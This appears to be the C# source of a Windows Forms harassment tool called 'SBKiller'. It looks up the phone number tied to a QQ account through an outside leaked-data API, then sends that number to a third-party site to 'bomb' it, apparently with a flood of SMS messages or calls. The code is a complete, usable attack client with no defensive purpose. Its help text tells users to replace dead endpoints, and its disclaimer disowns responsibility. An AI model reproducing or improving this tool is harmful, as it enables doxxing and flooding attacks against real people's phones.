using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.IO;

namespace SBKiller
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            string a = textBox1.Text;
            bool i = IsNumber(a);
            if (a == "")
            {
                MessageBox.Show("请输入QQ号！", "提示", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            else
            {
                if (i == false)
                {
                    MessageBox.Show("WDNMD！请输入正确的QQ号！", "提示", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                else
                {
                    try
                    {
                        string b = HttpGet("http://api.qb-api.com/qbtxt-api.php?qq=" + a);
                        string c = System.Text.RegularExpressions.Regex.Replace(b, @"[^0-9]+", "");
                        if (c != "")
                        {
                            string r = System.Text.RegularExpressions.Regex.Replace(c, a, "");
                            textBox2.Text = r;
                        }
                        else
                        {
                            textBox2.Text = "数据库中没有记录！";
                        }
                    }
                    catch
                    {
                        MessageBox.Show("无法连接接口！", "提示", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    }
                }
            }
        }
        public static bool IsNumber(string str)
        {
            if (str == null || str.Length == 0)
                return false;
            ASCIIEncoding ascii = new ASCIIEncoding();
            byte[] bytestr = ascii.GetBytes(str);

            foreach (byte c in bytestr)
            {
                if (c < 48 || c > 57)
                {
                    return false;
                }
            }
            return true;
        }
        public static string HttpGet(string url)
        {
            Encoding encoding = Encoding.UTF8;
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
            request.Method = "GET";
            request.Accept = "text/html, application/xhtml+xml, */*";
            request.ContentType = "application/json";
            request.Timeout = 20000;
            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
            using (StreamReader reader = new StreamReader(response.GetResponseStream(), Encoding.UTF8))
            {
                return reader.ReadToEnd();
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            this.textBox1.Select();
            textBox2.ReadOnly = true;
            label6.Text = "免责申明：请使用者注意使用环境并遵守国家相关法律法规！\n由于使用不当造成的后果作者不承担任何责任！";
        }

        private void button2_Click(object sender, EventArgs e)
        {
            textBox3.Text = textBox2.Text;
        }

        private void button3_Click(object sender, EventArgs e)
        {
            string a = textBox3.Text;
            bool i = IsNumber(a);
            if (button3.Text == "开始轰炸")
            {
                if (textBox3.Text.Length != 11)
                {
                    MessageBox.Show("请输入11位手机号！", "提示", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                else if (i == false)
                {
                    MessageBox.Show("WDNMD！请输入正确的手机号！", "提示", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                else
                {
                    string b = "http://1cdsw.top/index.php?hm=" + a + "&ok=";
                    webBrowser1.Navigate(b);
                    button3.Text = "停止轰炸";
                    textBox3.ReadOnly = true;
                    MessageBox.Show("正在对" + a + "进行轰炸！", "提示", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
            }
            else
            {
                webBrowser1.Navigate("");
                textBox3.ReadOnly = false;
                button3.Text = "开始轰炸";
            }
        }

        private void button4_Click(object sender, EventArgs e)
        {
            MessageBox.Show("BombThreads网络安全——Thrower编写\nQQ群：801170943\n输入需查询的QQ号点击查询！输入手机号点击开始轰炸！\n如提示无法连接接口，表明程序自带接口已经挂掉，请等待修复或检查更新当然也可下载程序源码自行更改接口！", "使用帮助", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void textBox1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                this.button1_Click(sender, e);
            }
        }

        private void textBox3_KeyDown_1(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                this.button3_Click(sender, e);
            }
        }
    }
}
